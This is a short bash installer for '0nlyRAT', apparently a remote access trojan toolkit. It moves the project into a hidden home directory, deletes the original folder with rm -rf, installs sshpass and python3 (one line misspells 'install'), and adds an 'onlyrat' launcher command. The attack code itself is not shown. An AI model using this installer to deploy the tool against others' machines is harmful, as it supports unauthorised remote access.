#!/bin/bash

echo [*] re-arranging files...
mkdir ~/.0nlyRAT
cd ..
mv ./Project-0nlyRAT/* ~/.0nlyRAT
rm -rf ./Project-0nlyRAT
cd ~/.0nlyRAT
echo [*] complete...

echo [*] installing necessary files...
sudo apt-get update
sudo apt-get install sshpass
sudo apt-get isntall python3
echo [*] complete...

echo [*] creating alias...
sudo touch /usr/local/bin/onlyrat
printf "#!/bin/bash\npython3 ~/.0nlyRAT/main.py \"\$@\""|sudo tee /usr/local/bin/onlyrat
sudo chmod +x /usr/local/bin/onlyrat
printf "\n[*] Installation Complete\n"

printf "\n[*] Type \"onlyrat\" in terminal to start 0nlyRAT\n"